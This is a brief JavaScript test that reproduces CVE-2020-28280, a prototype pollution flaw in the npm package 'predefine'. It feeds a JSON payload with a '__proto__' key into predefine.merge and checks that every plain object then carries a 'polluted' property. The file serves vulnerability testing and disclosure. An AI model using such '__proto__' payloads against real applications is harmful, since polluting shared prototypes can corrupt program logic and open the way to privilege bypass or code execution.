//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28280
test("prototype pollution in predefine", () => {
  expect({}.polluted).toBe(undefined);

  var predefine = require("predefine");
  const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  predefine.merge({}, payload);

  expect({}.polluted).toBe("yes");
});
